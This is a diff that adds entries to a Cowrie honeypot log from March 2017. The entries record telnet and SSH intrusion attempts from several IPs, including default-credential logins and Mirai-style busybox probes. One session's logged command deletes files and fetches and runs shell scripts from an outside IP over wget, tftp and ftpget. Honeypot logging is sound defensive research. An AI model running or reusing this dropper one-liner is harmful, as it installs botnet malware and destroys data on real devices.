@@ -4191,3 +4191,76 @@
 2017-03-06T03:00:59+0000 [CowrieTelnetTransport,43411,178.152.52.15] CMD: shell
 2017-03-06T03:00:59+0000 [CowrieTelnetTransport,43411,178.152.52.15] Command not found: shell
 2017-03-06T03:01:01+0000 [CowrieTelnetTransport,43411,178.152.52.15] Received unhandled keyID: '\x00'
+2017-03-06T03:01:02+0000 [CowrieTelnetTransport,43411,178.152.52.15] CMD: sh
+2017-03-06T03:01:02+0000 [CowrieTelnetTransport,43411,178.152.52.15] Command found: sh 
+2017-03-06T03:01:02+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 116.31.116.51:58455 (10.8.41.81:2222) [session: d66c9a81]
+2017-03-06T03:01:03+0000 [CowrieTelnetTransport,43412,178.152.52.15] login attempt: 3
+2017-03-06T03:01:03+0000 [CowrieTelnetTransport,43412,178.152.52.15] login return, expect: [root/1111]
+2017-03-06T03:01:03+0000 [CowrieTelnetTransport,43412,178.152.52.15] login attempt [enable\x00/system\x00] failed
+2017-03-06T03:01:03+0000 [CowrieTelnetTransport,43412,178.152.52.15] Warning: state changed and new state returned
+2017-03-06T03:01:03+0000 [HoneyPotSSHTransport,9479,116.31.116.51] Remote SSH version: SSH-2.0-PUTTY
+2017-03-06T03:01:03+0000 [HoneyPotSSHTransport,9479,116.31.116.51] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-03-06T03:01:03+0000 [HoneyPotSSHTransport,9479,116.31.116.51] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-03-06T03:01:03+0000 [HoneyPotSSHTransport,9479,116.31.116.51] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-03-06T03:01:05+0000 [CowrieTelnetTransport,43411,178.152.52.15] Received unhandled keyID: '\x00'
+2017-03-06T03:01:09+0000 [CowrieTelnetTransport,43411,178.152.52.15] CMD: /bin/busybox MIRAI
+2017-03-06T03:01:09+0000 [CowrieTelnetTransport,43411,178.152.52.15] Command found: /bin/busybox MIRAI
+2017-03-06T03:01:13+0000 [CowrieTelnetTransport,43412,178.152.52.15] login attempt: 4
+2017-03-06T03:01:13+0000 [CowrieTelnetTransport,43412,178.152.52.15] login return, expect: [root/1111]
+2017-03-06T03:01:14+0000 [CowrieTelnetTransport,43412,178.152.52.15] login attempt [shell\x00/sh\x00] failed
+2017-03-06T03:01:14+0000 [CowrieTelnetTransport,43412,178.152.52.15] Warning: state changed and new state returned
+2017-03-06T03:01:18+0000 [CowrieTelnetTransport,43414,220.134.241.229] first time for 220.134.241.229, need: 1
+2017-03-06T03:01:18+0000 [CowrieTelnetTransport,43414,220.134.241.229] login attempt: 1
+2017-03-06T03:01:19+0000 [CowrieTelnetTransport,43414,220.134.241.229] login attempt [root/root] succeeded
+2017-03-06T03:01:21+0000 [CowrieTelnetTransport,43414,220.134.241.229] Opening TTY Log: log/tty/20170306-030121-None-43414i.log
+2017-03-06T03:01:21+0000 [CowrieTelnetTransport,43414,220.134.241.229] Warning: state changed and new state returned
+2017-03-06T03:01:21+0000 [CowrieTelnetTransport,43405,181.120.22.67] Closing TTY Log: log/tty/20170306-025937-None-43405i.log after 103 seconds
+2017-03-06T03:01:21+0000 [CowrieTelnetTransport,43405,181.120.22.67] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-03-06T03:01:21+0000 [CowrieTelnetTransport,43405,181.120.22.67] Connection lost after 107 seconds
+2017-03-06T03:01:21+0000 [CowrieTelnetTransport,43411,178.152.52.15] Closing TTY Log: log/tty/20170306-030041-None-43411i.log after 39 seconds
+2017-03-06T03:01:21+0000 [CowrieTelnetTransport,43411,178.152.52.15] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-03-06T03:01:21+0000 [CowrieTelnetTransport,43411,178.152.52.15] Connection lost after 56 seconds
+2017-03-06T03:01:25+0000 [CowrieTelnetTransport,43414,220.134.241.229] CMD: sh
+2017-03-06T03:01:25+0000 [CowrieTelnetTransport,43414,220.134.241.229] Command found: sh 
+2017-03-06T03:01:26+0000 [CowrieTelnetTransport,43414,220.134.241.229] CMD: cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://5.196.199.225/bin.sh;sh bin.sh;busybox tftp -r bin2.sh -g 5.196.199.225;sh bin2.sh;busybox tftp 5.196.199.225 -c get bin3.sh;sh bin3.sh;busybox ftpget 5.196.199.225 bin4.sh bin4.sh;sh bin4.sh;exit
+2017-03-06T03:01:26+0000 [CowrieTelnetTransport,43414,220.134.241.229] Command found: cd /tmp
+2017-03-06T03:01:26+0000 [CowrieTelnetTransport,43414,220.134.241.229] Command found: cd /var/run
+2017-03-06T03:01:26+0000 [CowrieTelnetTransport,43414,220.134.241.229] Command found: cd /dev/shm
+2017-03-06T03:01:26+0000 [CowrieTelnetTransport,43414,220.134.241.229] Command found: cd /mnt
+2017-03-06T03:01:26+0000 [CowrieTelnetTransport,43414,220.134.241.229] Command found: cd /var
+2017-03-06T03:01:26+0000 [CowrieTelnetTransport,43414,220.134.241.229] Command found: rm -f /var/log /var/run /var/mail /var/tmp /var/opt /var/local /var/backups /var/spool /var/lock /var/lib /var/cache
+2017-03-06T03:01:26+0000 [CowrieTelnetTransport,43414,220.134.241.229] Command found: busybox wget http://5.196.199.225/bin.sh
+2017-03-06T03:01:26+0000 [CowrieTelnetTransport,43414,220.134.241.229] Command found: wget http://5.196.199.225/bin.sh
+2017-03-06T03:01:26+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://5.196.199.225/bin.sh>
+2017-03-06T03:01:26+0000 [HTTPPageDownloader,client] Command found: sh bin.sh
+2017-03-06T03:01:26+0000 [HTTPPageDownloader,client] Command found: busybox tftp -r bin2.sh -g 5.196.199.225
+2017-03-06T03:01:26+0000 [HTTPPageDownloader,client] Command found: tftp -r bin2.sh -g 5.196.199.225
+2017-03-06T03:01:26+0000 [HTTPPageDownloader,client] Command found: sh bin2.sh
+2017-03-06T03:01:26+0000 [HTTPPageDownloader,client] Command found: busybox tftp 5.196.199.225 -c get bin3.sh
+2017-03-06T03:01:26+0000 [HTTPPageDownloader,client] Command found: tftp 5.196.199.225 -c get bin3.sh
+2017-03-06T03:01:26+0000 [HTTPPageDownloader,client] Command found: sh bin3.sh
+2017-03-06T03:01:26+0000 [HTTPPageDownloader,client] Command found: busybox ftpget 5.196.199.225 bin4.sh bin4.sh
+2017-03-06T03:01:26+0000 [HTTPPageDownloader,client] Command found: ftpget 5.196.199.225 bin4.sh bin4.sh
+2017-03-06T03:01:26+0000 [HTTPPageDownloader,client] FTP login failed: user=, passwd=, err=530 Login or password incorrect!
+2017-03-06T03:01:26+0000 [HTTPPageDownloader,client] Command found: sh bin4.sh
+2017-03-06T03:01:26+0000 [HTTPPageDownloader,client] Command found: exit 
+2017-03-06T03:01:26+0000 [HTTPPageDownloader,client] Process ended. Telnet Session disconnected
+2017-03-06T03:01:26+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://5.196.199.225/bin.sh>
+2017-03-06T03:01:26+0000 [CowrieTelnetTransport,43414,220.134.241.229] Closing TTY Log: log/tty/20170306-030121-None-43414i.log after 5 seconds
+2017-03-06T03:01:26+0000 [CowrieTelnetTransport,43414,220.134.241.229] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-03-06T03:01:26+0000 [CowrieTelnetTransport,43414,220.134.241.229] Connection lost after 28 seconds
+2017-03-06T03:01:42+0000 [HoneyPotSSHTransport,9479,116.31.116.51] NEW KEYS
+2017-03-06T03:01:52+0000 [HoneyPotSSHTransport,9479,116.31.116.51] starting service 'ssh-userauth'
+2017-03-06T03:01:53+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,9479,116.31.116.51] 'root' trying auth 'none'
+2017-03-06T03:01:54+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,9479,116.31.116.51] 'root' authenticated with 'none'
+2017-03-06T03:01:54+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,9479,116.31.116.51] starting service 'ssh-connection'
+2017-03-06T03:01:55+0000 [HoneyPotSSHTransport,9479,116.31.116.51] Got remote error, code 11
+	reason: 
+2017-03-06T03:01:55+0000 [HoneyPotSSHTransport,9479,116.31.116.51] avatar root logging out
+2017-03-06T03:01:55+0000 [HoneyPotSSHTransport,9479,116.31.116.51] connection lost
+2017-03-06T03:01:55+0000 [HoneyPotSSHTransport,9479,116.31.116.51] Connection lost after 52 seconds
+2017-03-06T03:01:58+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 178.152.52.15:36386 (10.8.41.81:2223) [session: TT43415]
+2017-03-06T03:01:59+0000 [CowrieTelnetTransport,43412,178.152.52.15] Connection lost after 92 seconds
